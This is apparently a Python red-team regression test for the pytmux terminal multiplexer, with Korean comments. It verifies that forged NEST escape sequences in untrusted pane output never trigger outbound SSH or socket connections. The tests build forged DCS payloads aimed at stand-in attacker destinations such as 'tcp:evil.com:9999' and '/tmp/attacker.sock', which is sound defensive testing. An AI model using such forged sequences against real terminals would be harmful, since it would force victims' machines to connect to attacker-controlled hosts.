"""레드팀(Tier 1+) — NEST 자동 승격의 **부작용 오라클**.

배경(docs/internal/NEST_AUTOATTACH_VULN_2026-06-20.md §9): 기존 NEST 단위 테스트
(test_remote.py)는 **내부 상태**(`pane._ssh_dest == ""`, 빈 `_remotes_dict`)를 단언했고,
퍼징(fuzz_targets.py)은 **파서 안정성**(예외 없음·출력 bounded)만 봤다. 둘 다 "유효한
DCS 가 올바르게 파싱된 뒤 부적절하게 신뢰돼 임의 호스트로 아웃바운드한다"는 권한
경계 결함(NEW-1 High)을 **구조적으로 못 잡는다** — 크래시가 아니고, 위험은 파싱 *후*
부작용에 있기 때문.

이 파일은 그 빈자리를 메운다: 신뢰 불가 패널 출력을 **실제 서버 배선**에 먹이고,
egress 1차 함수(`ipc.open_connection`·`asyncio.create_subprocess_exec`)를 가로채
**"비신뢰 출력은 결코 아웃바운드 연결을 만들지 않는다"** 는 *행위 속성*을 단언한다.
내부 구현 이름이 아니라 **관측 가능한 부작용**을 오라클로 삼으므로, 가드가 리팩터돼도
회귀를 잡는다. 공격 모델 = 위협모델 #4(패널에서 신뢰 불가 출력을 보기만 함).
"""
from __future__ import annotations

import asyncio
import base64
import os

from harness import server_only, teardown
from pytmuxlib import ipc, sshwrap


# ---- 위조 DCS 합성(신뢰 불가 패널 출력이 emit 할 수 있는 바이트) ----
def _server_token() -> str:
    return sshwrap.load_or_create_token(ipc.default_state_dir())


def _dcs_dest(dest: str, token: str | None = None) -> bytes:
    """NEST_DEST DCS. provenance 머리줄(token)이 서버 것과 일치해야 `_ssh_dest` 가
    기록된다(NEW-1 layer 1). token=None → 실제 서버 토큰(정상 래퍼 위장)."""
    if token is None:
        token = _server_token()
    payload = token + "\n" + "ssh\n" + dest
    b64 = base64.b64encode(payload.encode()).decode().encode()
    return sshwrap.NEST_DEST_PRE + b64 + sshwrap.DCS_ST


def _dcs_req(selfreport: str) -> bytes:
    """NEST_ATTACH_REQ DCS(원격 pytmux 의 승격 요청 위장)."""
    b64 = base64.b64encode(selfreport.encode()).decode().encode()
    return sshwrap.NEST_REQ_PRE + b64 + sshwrap.DCS_ST


class _Pty:
    """패널 pty 스텁 — NEST_ACK 등 서버가 패널에 쓰는 바이트를 삼킨다."""
    def __init__(self):
        self.writes = []

    def write(self, b):
        self.writes.append(b)

    def set_winsize(self, rows, cols):
        pass


class _EgressMonitor:
    """서버의 아웃바운드 1차 함수를 가로채 **시도된 모든 외부 연결 목표**를 기록하고
    즉시 거부한다(실제 연결 0 — 테스트가 외부로 새지 않게). 어떤 코드 경로가
    비신뢰 입력으로 연결을 시도하면 그 목표가 여기 남아 오라클이 잡는다."""

    def __init__(self):
        self.connects: list[str] = []          # ipc.open_connection(endpoint)
        self.ssh_hosts: list[str] = []          # create_subprocess_exec("ssh", …)
        self._orig_open = None
        self._orig_exec = None

    async def _open(self, endpoint, *a, **k):
        self.connects.append(endpoint)
        raise ConnectionRefusedError(f"egress-monitor: blocked {endpoint!r}")

    async def _exec(self, *argv, **k):
        # argv = ("ssh", "-T", "-o", "BatchMode=yes", "--", host, "pytmux", …)
        host = argv[5] if len(argv) > 5 else (argv[-1] if argv else "?")
        self.ssh_hosts.append(host)
        raise ConnectionRefusedError(f"egress-monitor: blocked ssh {host!r}")

    def __enter__(self):
        self._orig_open = ipc.open_connection
        self._orig_exec = asyncio.create_subprocess_exec
        ipc.open_connection = self._open
        asyncio.create_subprocess_exec = self._exec
        return self

    def __exit__(self, *exc):
        ipc.open_connection = self._orig_open
        asyncio.create_subprocess_exec = self._orig_exec
        return False

    def nonlocal_targets(self) -> list[str]:
        """로컬(unix소켓 경로·loopback)이 아닌 — 즉 임의 머신으로 새는 — 시도."""
        bad = []
        for ep in self.connects:
            local = ep.startswith("/") or ep.startswith(
                ("tcp:127.0.0.1:", "tcp:localhost:", "tcp:[::1]:"))
            if not local:
                bad.append(ep)
        bad.extend(self.ssh_hosts)              # ssh 호스트 직결은 전부 비로컬로 간주
        return bad


async def _drain(srv, pane, want_remotes_empty=True, tries=30):
    """`_nest_attach_request` 가 띄운 `_nest_do_attach` 태스크를 소진시킨다."""
    for _ in range(tries):
        await asyncio.sleep(0.01)


async def test_forged_panel_output_never_egresses():
    """핵심 부작용 오라클: 신뢰 불가 패널 출력의 어떤 위조 NEST 시퀀스도 **외부
    아웃바운드 연결을 만들지 못한다**. egress 1차 함수를 가로채 실측한다.

    배터리(전부 같은 세션·패널에 차례로 먹임):
      A. 위조 토큰 + tcp:evil + 매칭 REQ — provenance(layer 1)가 `_ssh_dest` 차단.
      B. 위조 토큰 + /tmp/attacker.sock + REQ — 로컬 형태여도 layer 1 이 차단.
      C. **유효 토큰** + tcp:evil + REQ — 정상 래퍼가 기록했어도(사용자 유도 ssh
         tcp:evil 시나리오) endpoint-block(layer 2)이 직결 거부.
      D. 유효 토큰 + tcp:10.0.0.5:22(사설망) + REQ — layer 2 거부.
    오라클: 배터리 전체 후 **외부 연결 시도 0건**(`nonlocal_targets() == []`).
    """
    if os.name == "nt":
        return
    srvA, taskA, sockA = await server_only()
    try:
        sessA = srvA.ensure_default_session(80, 24)
        pane = sessA.active_window.active_pane
        real, pane.pty = pane.pty, _Pty()
        tok = _server_token()
        battery = [
            ("deadbeef", "tcp:evil.com:9999"),                 # A
            ("deadbeef", "/tmp/attacker.sock"),                # B
            (tok, "tcp:evil.com:9999"),                        # C
            (tok, "tcp:10.0.0.5:22"),                          # D
        ]
        with _EgressMonitor() as mon:
            for token, dest in battery:
                pane._ssh_dest = ""                            # 케이스 격리
                pane._nest_req_ts = 0.0                        # 디바운스 리셋
                srvA._on_pane_data(pane, b"$ " + _dcs_dest(dest, token=token))
                srvA._on_pane_data(pane, _dcs_req(dest))
                await _drain(srvA, pane)
                # 위조 토큰(A·B)은 _ssh_dest 미기록이어야 한다(layer 1).
                if token == "deadbeef":
                    assert pane._ssh_dest == "", (
                        "위조 토큰 DEST 가 _ssh_dest 를 심음(layer 1 파손)", dest)
            bad = mon.nonlocal_targets()
            assert bad == [], (
                "비신뢰 패널 출력이 외부 아웃바운드를 유발(NEW-1 회귀)", bad)
            assert mon.ssh_hosts == [], ("위조 출력이 ssh 직결 유발", mon.ssh_hosts)
        pane.pty = real
    finally:
        await teardown(srvA, taskA, sockA)


async def test_nest_endpoint_block_boundary_is_local_only():
    """심층방어(layer 2) 경계 실측: provenance 가 우회됐다고 *가정*하고 `_ssh_dest`
    를 직접 주입해 `_nest_do_attach` 를 구동, egress 가 **로컬 endpoint 에서만**
    일어남을 확인한다(임의 호스트는 0건). 단위 테스트(test_nest_do_attach_blocks_
    nonlocal_endpoint)가 링크 부재를 보는 것과 달리, 여기선 **연결 1차 함수 호출
    자체**를 오라클로 삼아 거짓음성(원격 attach 가 다른 경로로 새는 경우)을 막는다."""
    if os.name == "nt":
        return
    srvA, taskA, sockA = await server_only()
    try:
        sessA = srvA.ensure_default_session(80, 24)
        # 비로컬 목표는 egress 에 절대 도달하지 않는다.
        with _EgressMonitor() as mon:
            for evil in ("tcp:evil.com:9999", "tcp:10.0.0.5:22",
                         "tcp:[2001:db8::1]:22"):
                await srvA._nest_do_attach(sessA, evil)
            assert mon.connects == [] and mon.ssh_hosts == [], (
                "비로컬 endpoint 가 egress 도달(layer 2 파손)",
                mon.connects, mon.ssh_hosts)
        # 로컬 loopback 은 *의도적으로* 직결을 허용한다(같은 머신 페더레이션) —
        # egress 에 도달하되 목표는 loopback 으로 한정됨을 확인(경계가 정확히 로컬).
        with _EgressMonitor() as mon:
            await srvA._nest_do_attach(sessA, "tcp:127.0.0.1:65000")
            assert mon.connects == ["tcp:127.0.0.1:65000"], (
                "로컬 loopback 직결 경로가 동작해야 함(경계 = 로컬만)", mon.connects)
            assert mon.nonlocal_targets() == [], mon.nonlocal_targets()
    finally:
        await teardown(srvA, taskA, sockA)
